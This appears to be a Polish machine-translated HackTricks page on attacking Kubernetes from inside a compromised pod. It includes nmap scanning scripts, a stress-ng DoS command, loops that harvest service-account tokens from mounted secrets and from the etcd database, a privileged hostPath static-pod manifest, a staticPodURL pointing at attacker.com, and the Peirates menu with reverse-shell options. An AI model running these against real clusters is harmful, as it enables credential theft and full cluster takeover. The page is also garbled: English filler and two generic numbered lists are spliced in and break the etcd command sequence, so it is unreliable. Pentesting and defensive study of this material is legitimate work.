# Atakowanie Kubernetesa z wnętrza Poda

<details>

<summary><strong>Dowiedz się, jak hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## **Ucieczka z Poda**

**Jeśli masz szczęście, możesz uciec z niego do węzła:**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### Ucieczka z Poda

Aby spróbować uciec z Poda, możesz najpierw potrzebować **podwyższenia uprawnień**, niektóre techniki do tego:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

Możesz sprawdzić te **przełamania dockerowe, aby spróbować uciec** z poda, który został skompromitowany:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

### Nadużywanie uprawnień Kubernetes

Jak wyjaśniono w sekcji dotyczącej **enumeracji Kubernetes**:

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

Zazwyczaj pody są uruchamiane z **tokenem konta usługi** wewnątrz nich. To konto usługi może mieć przypisane pewne **uprawnienia**, które można **nadużyć**, aby **przejść** do innych podów lub nawet **uciec** do skonfigurowanych w klastrze węzłów. Sprawdź, jak to zrobić:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Nadużywanie uprawnień chmury

Jeśli pod jest uruchamiany w **środowisku chmurowym**, możesz próbować **wyciec token z punktu końcowego metadanych** i podwyższyć uprawnienia, używając go.

## Wyszukiwanie podatnych usług sieciowych

Jako że jesteś w środowisku Kubernetes, jeśli nie możesz podwyższyć uprawnień, nadużywając obecnych uprawnień podów, i nie możesz uciec z kontenera, powinieneś **szukać potencjalnie podatnych usług.**

### Usługi

**W tym celu możesz spróbować uzyskać wszystkie usługi środowiska Kubernetes:**
```
kubectl get svc --all-namespaces
```
Domyślnie Kubernetes używa płaskiego schematu sieciowego, co oznacza, że **każdy pod/usługa w klastrze może komunikować się z innymi**. **Przestrzenie nazw** w klastrze **nie mają domyślnie żadnych ograniczeń dotyczących bezpieczeństwa sieciowego**. Każdy w przestrzeni nazw może komunikować się z innymi przestrzeniami nazw.

### Skanowanie

Następujący skrypt Bash (pobrany z [warsztatu Kubernetes](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s\_cheatsheet.md)) zainstaluje i przeskanuje zakresy IP klastra Kubernetes:
```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```
Sprawdź następującą stronę, aby dowiedzieć się, jak można **atakować specyficzne usługi Kubernetes**, aby **skompromitować inne pody/całe środowisko**:

{% content-ref url="pentesting-kubernetes-services.md" %}
[pentesting-kubernetes-services.md](pentesting-kubernetes-services.md)
{% endcontent-ref %}

### Podsłuchiwanie

W przypadku, gdy **skompromitowany pod uruchamia wrażliwą usługę**, gdzie inne pody muszą się uwierzytelnić, możesz próbować uzyskać poświadczenia wysyłane przez inne pody, **podglądając lokalne komunikacje**.

## Podrabianie sieci

Domyślnie techniki takie jak **podrabianie ARP** (i dzięki temu **podrabianie DNS**) działają w sieci Kubernetes. Następnie, wewnątrz poda, jeśli masz **uprawnienia NET\_RAW** (które są domyślnie dostępne), będziesz mógł wysyłać niestandardowo skonstruowane pakiety sieciowe i przeprowadzać **ataki typu MitM za pomocą podrabiania ARP na wszystkie pody działające na tym samym węźle.**\
Ponadto, jeśli **złośliwy pod** działa na **tym samym węźle co serwer DNS**, będziesz mógł przeprowadzić **atak podrabiania DNS na wszystkie pody w klastrze**.

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

## Node DoS

W manifestach Kubernetes nie ma określonych zasobów ani **ograniczeń** dla kontenerów. Jako atakujący, możemy **zużyć wszystkie zasoby, na których działa pod/deployment**, wyczerpując inne zasoby i powodując DoS dla środowiska.

Można to zrobić za pomocą narzędzia takiego jak [**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng):
```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```
Możesz zobaczyć różnicę podczas uruchamiania `stress-ng` i po nim.
```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```
## Node Post-Exploitation

Jeśli udało ci się **wydostać z kontenera**, znajdziesz kilka interesujących rzeczy w węźle:

* Proces **Container Runtime** (Docker)
* Więcej **pods/containers** działających na węźle, które można wykorzystać, tak jak ten (więcej tokenów)
* Cały **system plików** i **system operacyjny** ogólnie
* Serwis **Kube-Proxy** nasłuchujący
* Serwis **Kubelet** nasłuchujący. Sprawdź pliki konfiguracyjne:
* Katalog: `/var/lib/kubelet/`
* `/var/lib/kubelet/kubeconfig`
* `/var/lib/kubelet/kubelet.conf`
* `/var/lib/kubelet/config.yaml`
* `/var/lib/kubelet/kubeadm-flags.env`
* `/etc/kubernetes/kubelet-kubeconfig`
* Inne **wspólne pliki Kubernetes**:
* `$HOME/.kube/config` - **Konfiguracja użytkownika**
* `/etc/kubernetes/kubelet.conf`- **Konfiguracja regularna**
* `/etc/kubernetes/bootstrap-kubelet.conf` - **Konfiguracja rozruchowa**
* `/etc/kubernetes/manifests/etcd.yaml` - **Konfiguracja etcd**
* `/etc/kubernetes/pki` - **Klucz Kubernetes**

### Znajdź kubeconfig węzła

Jeśli nie możesz znaleźć pliku kubeconfig w jednym z wcześniej wspomnianych ścieżek, **sprawdź argument `--kubeconfig` procesu kubelet**:
```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```
### Kradzież sekretów

To steal secrets from within a Kubernetes pod, you can use various techniques. Here are some common methods:

#### 1. Environment Variables

If the application running inside the pod uses environment variables to store sensitive information, you can access these variables from within the pod. Use the `env` command to list all the environment variables and look for any that may contain secrets.

#### 2. Mounted Volumes

Check if the pod has any mounted volumes. If the sensitive information is stored in a file within the volume, you can access it by reading the file from within the pod.

#### 3. API Access

If the pod has access to the Kubernetes API, you can use this access to retrieve secrets. Use the appropriate API calls to list and retrieve secrets from the cluster.

#### 4. Service Accounts

If the pod is using a service account, check if it has any permissions to access secrets. If so, you can use the service account's credentials to retrieve the secrets.

#### 5. Reverse Shell

If you have the ability to execute commands within the pod, you can establish a reverse shell to gain interactive access. This allows you to navigate the file system and search for any files or environment variables that may contain secrets.

Remember to always follow ethical guidelines and obtain proper authorization before attempting any of these techniques.
```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```
Skrypt [**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh) automatycznie **pobierze tokeny innych podów i sprawdzi, czy mają uprawnienia**, których szukasz (zamiast sprawdzania ich pojedynczo):
```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```
### Przywilejowane DaemonSets

DaemonSet to **pod**, który będzie **uruchamiany** na **wszystkich węzłach klastra**. Dlatego jeśli DaemonSet jest skonfigurowany z **uprzywilejowanym kontem usługi**, na **wszystkich węzłach** będziesz mógł znaleźć **token** tego **uprzywilejowanego konta usługi**, który można wykorzystać.

Wykorzystanie jest takie samo jak w poprzedniej sekcji, ale teraz nie zależy to od szczęścia.

### Przejście do chmury

Jeśli klaster jest zarządzany przez usługę chmurową, zazwyczaj **węzeł będzie miał inny dostęp do punktu końcowego metadanych** niż Pod. Dlatego spróbuj **uzyskać dostęp do punktu końcowego metadanych z węzła** (lub z pod z hostNetwork ustawionym na True):

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

### Kradzież etcd

Jeśli możesz określić [**nodeName**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node) węzła, na którym zostanie uruchomiony kontener, uzyskaj powłokę w węźle kontrolnym i pobierz bazę danych **etcd**:
```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```
Węzły **control-plane** mają rolę **master** i w **zarządzanych klastrach w chmurze nie będziesz w stanie uruchomić na nich niczego**.

#### Odczytywanie sekretów z etcd

Jeśli możesz uruchomić swój pod na węźle **control-plane** za pomocą selektora `nodeName` w specyfikacji poda, możesz łatwo uzyskać dostęp do bazy danych `etcd`, która zawiera wszystkie konfiguracje klastra, w tym wszystkie sekrety.

Poniżej znajduje się szybki i niezbyt elegancki sposób na pobranie sekretów z `etcd`, jeśli działa on na węźle **control-plane**, na którym się znajdujesz. Jeśli chcesz bardziej eleganckiego rozwiązania, które uruchamia pod z narzędziem klienta `etcdctl` i używa poświadczeń węzła **control-plane** do połączenia się z `etcd`, gdziekolwiek jest uruchomiony, sprawdź [ten przykładowy manifest](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml) od @mauilion.

**Sprawdź, czy `etcd` działa na węźle control-plane i zobacz, gdzie znajduje się baza danych (To jest na klastrze utworzonym za pomocą `kubeadm`)**
```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```
# Atakowanie Kubernetes z wnętrza poda

W przypadku, gdy uzyskamy dostęp do kontenera w klastrze Kubernetes, możemy przeprowadzić atak na sam klaster. Poniżej przedstawiam kilka technik, które można zastosować w celu eskalacji uprawnień i uzyskania dostępu do zasobów klastra.

## 1. Wykorzystanie podatności w wersji Kubernetes

Sprawdź, czy wersja Kubernetes, na której działa klaster, jest podatna na znane luki bezpieczeństwa. Możesz to zrobić, sprawdzając dokumentację lub korzystając z narzędzi takich jak `kubeletctl` lub `kube-hunter`.

## 2. Przechwytywanie tokena serwisowego

Jeśli w podzie działa serwis, możemy przechwycić token serwisowy, który może nam umożliwić dostęp do innych zasobów klastra. Możemy to zrobić, przechwytując ruch sieciowy lub wykorzystując podatności w aplikacji serwisu.

## 3. Wykorzystanie podatności w aplikacji

Jeśli aplikacja w podzie jest podatna na ataki, możemy wykorzystać tę podatność do eskalacji uprawnień i uzyskania dostępu do innych zasobów klastra. Możemy to zrobić, wykorzystując narzędzia takie jak `Metasploit` lub `ExploitDB`.

## 4. Atak na kubelet

Jeśli mamy dostęp do kontenera, możemy próbować atakować kubelet, który zarządza podem. Możemy to zrobić, wykorzystując narzędzia takie jak `kubeletctl` lub `kubelet-exploit`.

## 5. Atak na API Kubernetes

Jeśli mamy dostęp do kontenera, możemy próbować atakować API Kubernetes. Możemy to zrobić, wykorzystując narzędzia takie jak `kubectl` lub `kube-api`.

## 6. Wykorzystanie podatności w narzędziach i skryptach

Jeśli w podzie są zainstalowane narzędzia lub skrypty, które są podatne na ataki, możemy wykorzystać tę podatność do eskalacji uprawnień i uzyskania dostępu do innych zasobów klastra.

## 7. Atak na sieć klastra

Jeśli mamy dostęp do kontenera, możemy próbować atakować sieć klastra. Możemy to zrobić, wykorzystując narzędzia takie jak `Wireshark` lub `tcpdump`.

## 8. Atak na system operacyjny hosta

Jeśli mamy dostęp do kontenera, możemy próbować atakować system operacyjny hosta, na którym działa klaster Kubernetes. Możemy to zrobić, wykorzystując narzędzia takie jak `Metasploit` lub `ExploitDB`.

## 9. Atak na inne pody

Jeśli mamy dostęp do kontenera, możemy próbować atakować inne pody w klastrze. Możemy to zrobić, wykorzystując narzędzia takie jak `kubectl` lub `kube-api`.

## 10. Wykorzystanie podatności w konfiguracji klastra

Jeśli mamy dostęp do kontenera, możemy sprawdzić, czy konfiguracja klastra jest podatna na ataki. Możemy to zrobić, analizując pliki konfiguracyjne lub korzystając z narzędzi takich jak `kube-hunter` lub `kube-bench`.
```bash
data-dir=/var/lib/etcd
```
**Wyświetlanie danych w bazie danych etcd:**

```bash
kubectl exec -it <pod_name> -- sh
ETCDCTL_API=3 etcdctl get --prefix ""
```

Możesz wyświetlić dane w bazie danych etcd, wykonując następujące polecenia:

1. Uruchom powłokę wewnątrz kontenera poda za pomocą polecenia `kubectl exec -it <pod_name> -- sh`.
2. Ustaw zmienną środowiskową `ETCDCTL_API` na wartość `3`.
3. Wykonaj polecenie `etcdctl get --prefix ""`, aby wyświetlić wszystkie dane w bazie danych etcd.
```bash
strings /var/lib/etcd/member/snap/db | less
```
**Wyodrębnij tokeny z bazy danych i pokaż nazwę konta usługi**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```
**To samo polecenie, ale z dodatkowymi grepami, aby zwrócić tylko domyślny token w przestrzeni nazw kube-system**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```
# Atakowanie Kubernetes z wnętrza poda

W przypadku, gdy uzyskamy dostęp do kontenera w klastrze Kubernetes, możemy przeprowadzić atak na sam klaster. Poniżej przedstawiam kilka technik, które można zastosować w celu eskalacji uprawnień i uzyskania dostępu do zasobów klastra.

## 1. Wykorzystanie podatności w wersji Kubernetes

Sprawdź, czy wersja Kubernetes, na której działa klaster, jest podatna na znane luki bezpieczeństwa. Możesz to zrobić, sprawdzając dokumentację lub korzystając z narzędzi takich jak `kubeletctl` lub `kube-hunter`.

## 2. Przechwytywanie tokena serwisowego

Jeśli w podzie działa serwis, możemy przechwycić token serwisowy, który może nam umożliwić dostęp do innych zasobów klastra. Możemy to zrobić, korzystając z narzędzi takich jak `kubectl` lub `kubeletctl`.

## 3. Wykorzystanie podatności w aplikacji

Jeśli aplikacja uruchomiona w podzie ma podatności, możemy je wykorzystać do eskalacji uprawnień i uzyskania dostępu do innych zasobów klastra. Możemy to zrobić, korzystając z narzędzi takich jak `Metasploit` lub `ExploitDB`.

## 4. Atak na kubelet

Jeśli mamy dostęp do kontenera, możemy próbować atakować kubelet, który zarządza podem. Możemy to zrobić, korzystając z narzędzi takich jak `kubeletctl` lub `kubelet-exploit`.

## 5. Atak na API serwera

Jeśli mamy dostęp do kontenera, możemy próbować atakować API serwera Kubernetes. Możemy to zrobić, korzystając z narzędzi takich jak `kubectl` lub `kubeletctl`.

## 6. Atak na etcd

Jeśli mamy dostęp do kontenera, możemy próbować atakować etcd, który przechowuje konfigurację klastra Kubernetes. Możemy to zrobić, korzystając z narzędzi takich jak `etcdctl` lub `etcd-exploit`.

## 7. Atak na sieć klastra

Jeśli mamy dostęp do kontenera, możemy próbować atakować sieć klastra Kubernetes. Możemy to zrobić, korzystając z narzędzi takich jak `nmap` lub `Wireshark`.

## 8. Atak na wolumeny

Jeśli mamy dostęp do kontenera, możemy próbować atakować wolumeny, które są używane przez pod. Możemy to zrobić, korzystając z narzędzi takich jak `kubectl` lub `kubeletctl`.

## 9. Atak na kontrolery replikacji

Jeśli mamy dostęp do kontenera, możemy próbować atakować kontrolery replikacji, które zarządzają replikami podów. Możemy to zrobić, korzystając z narzędzi takich jak `kubectl` lub `kubeletctl`.

## 10. Atak na usługi

Jeśli mamy dostęp do kontenera, możemy próbować atakować usługi, które są używane przez pod. Możemy to zrobić, korzystając z narzędzi takich jak `kubectl` lub `kubeletctl`.

## 11. Atak na przestrzenie nazw

Jeśli mamy dostęp do kontenera, możemy próbować atakować przestrzenie nazw, które są używane przez pod. Możemy to zrobić, korzystając z narzędzi takich jak `kubectl` lub `kubeletctl`.

## 12. Atak na role i uprawnienia

Jeśli mamy dostęp do kontenera, możemy próbować atakować role i uprawnienia, które są przypisane do podów. Możemy to zrobić, korzystając z narzędzi takich jak `kubectl` lub `kubeletctl`.

## 13. Atak na konfigurację klastra

Jeśli mamy dostęp do kontenera, możemy próbować atakować konfigurację klastra Kubernetes. Możemy to zrobić, korzystając z narzędzi takich jak `kubectl` lub `kubeletctl`.

## 14. Atak na zasoby klastra

Jeśli mamy dostęp do kontenera, możemy próbować atakować zasoby klastra Kubernetes, takie jak węzły, usługi, przestrzenie nazw itp. Możemy to zrobić, korzystając z narzędzi takich jak `kubectl` lub `kubeletctl`.

## 15. Atak na inne pody

Jeśli mamy dostęp do kontenera, możemy próbować atakować inne pody w klastrze Kubernetes. Możemy to zrobić, korzystając z narzędzi takich jak `kubectl` lub `kubeletctl`.

## 16. Atak na klastry wielotenantowe

Jeśli mamy dostęp do kontenera, możemy próbować atakować inne klastry w środowisku wielotenantowym. Możemy to zrobić, korzystając z narzędzi takich jak `kubectl` lub `kubeletctl`.

## 17. Atak na dostawców chmur

Jeśli mamy dostęp do kontenera, możemy próbować atakować dostawców chmur, którzy zarządzają klastrami Kubernetes. Możemy to zrobić, korzystając z narzędzi takich jak `kubectl` lub `kubeletctl`.

## 18. Atak na narzędzia monitorujące

Jeśli mamy dostęp do kontenera, możemy próbować atakować narzędzia monitorujące, które są używane w klastrze Kubernetes. Możemy to zrobić, korzystając z narzędzi takich jak `kubectl` lub `kubeletctl`.

## 19. Atak na narzędzia do zarządzania

Jeśli mamy dostęp do kontenera, możemy próbować atakować narzędzia do zarządzania, które są używane w klastrze Kubernetes. Możemy to zrobić, korzystając z narzędzi takich jak `kubectl` lub `kubeletctl`.

## 20. Atak na narzędzia do monitorowania bezpieczeństwa

Jeśli mamy dostęp do kontenera, możemy próbować atakować narzędzia do monitorowania bezpieczeństwa, które są używane w klastrze Kubernetes. Możemy to zrobić, korzystając z narzędzi takich jak `kubectl` lub `kubeletctl`.
```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```
### Statyczna/Mirrored Pods Persistence

_Static Pods_ są zarządzane bezpośrednio przez demona kubelet na określonym węźle, bez obserwowania ich przez serwer API. W przeciwieństwie do Podów zarządzanych przez płaszczyznę kontrolną (na przykład Deployment); zamiast tego, **kubelet obserwuje każdy statyczny Pod** (i restartuje go w przypadku awarii).

Dlatego statyczne Pod-y zawsze są **powiązane z jednym Kubeletem** na określonym węźle.

**Kubelet automatycznie próbuje utworzyć lustrzane Pod-y na serwerze API Kubernetes** dla każdego statycznego Pod-a. Oznacza to, że Pod-y działające na węźle są widoczne na serwerze API, ale nie można nimi zarządzać stamtąd. Nazwy Pod-ów będą miały dodany sufiks z nazwą hosta węzła poprzedzony myślnikiem.

{% hint style="danger" %}
**`spec` statycznego Pod-a nie może odwoływać się do innych obiektów API** (np. ServiceAccount, ConfigMap, Secret itp.). Nie można zatem wykorzystać tego zachowania do uruchomienia Pod-a z dowolnym serviceAccount-em na bieżącym węźle w celu skompromitowania klastra. Ale można to wykorzystać do uruchamiania Pod-ów w różnych przestrzeniach nazw (jeśli jest to przydatne z jakiegoś powodu).
{% endhint %}

Jeśli znajdujesz się wewnątrz hosta węzła, możesz sprawić, że **utworzy on statyczny Pod wewnątrz siebie**. Jest to bardzo przydatne, ponieważ może umożliwić **utworzenie Pod-a w innej przestrzeni nazw**, takiej jak **kube-system**.

Aby utworzyć statyczny Pod, [**dokumentacja jest bardzo pomocna**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/). W zasadzie potrzebujesz 2 rzeczy:

* Skonfiguruj parametr **`--pod-manifest-path=/etc/kubernetes/manifests`** w usłudze **kubelet**, lub w konfiguracji **kubelet** ([**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration)) i zrestartuj usługę
* Utwórz definicję **pod-a** w **`/etc/kubernetes/manifests`**

**Innym, bardziej skrytym sposobem byłoby:**

* Zmodyfikuj parametr **`staticPodURL`** w pliku konfiguracyjnym **kubelet** i ustaw coś takiego jak `staticPodURL: http://attacker.com:8765/pod.yaml`. Spowoduje to, że proces kubelet utworzy **statyczny Pod**, pobierając **konfigurację z podanego adresu URL**.

**Przykład** konfiguracji **pod-a** do utworzenia pod-a z uprawnieniami w **kube-system**, zaczerpnięty z [**tutaj**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/):
```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```
### Usuwanie podów + węzłów niedopuszczalnych

Jeśli atakujący **skompromituje węzeł** i będzie mógł **usuwać pody** z innych węzłów oraz **uniemożliwić uruchamianie podów na innych węzłach**, pody zostaną uruchomione na skompromitowanym węźle, a atakujący będzie mógł **ukraść tokeny** uruchamiane w tych podach.\
Aby uzyskać [**więcej informacji, kliknij tutaj**](abusing-roles-clusterroles-in-kubernetes/#delete-pods-+-unschedulable-nodes).

## Narzędzia automatyczne

* [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)
```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```
* [**https://github.com/r0binak/MTKPI**](https://github.com/r0binak/MTKPI)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
